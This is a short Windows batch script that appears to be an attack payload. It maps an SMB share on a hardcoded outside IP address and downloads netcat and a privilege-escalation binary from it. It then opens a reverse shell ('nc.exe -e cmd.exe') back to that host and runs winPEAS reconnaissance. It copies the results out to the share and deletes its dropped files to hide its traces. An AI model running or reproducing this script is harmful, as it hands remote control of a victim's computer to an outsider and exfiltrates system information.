@echo off

netsh wlan show profiles | find /c /v "" > numOfWifiPasswords.txt

type numOfWifiPasswords.txt >> C:\Users\hiyer\Downloads\test.txt

net use Z: \\34.172.125.189\sambashare /u:gainthehouse ""

copy Z:\nc.exe nc.exe
copy Z:\privesc.exe privesc.exe

nc.exe -e cmd.exe 34.172.125.189 80

.\winpeas.exe -outfile test.txt

copy test.txt Z:

net use Z: /delete


del C:\Users\hiyer\Downloads\test.txt
del C:\Users\hiyer\Downloads\numOfWifiPasswords.txt
del C:\Users\hiyer\Downloads\nc.exe
del C:\Users\hiyer\Downloads\privesc.exe
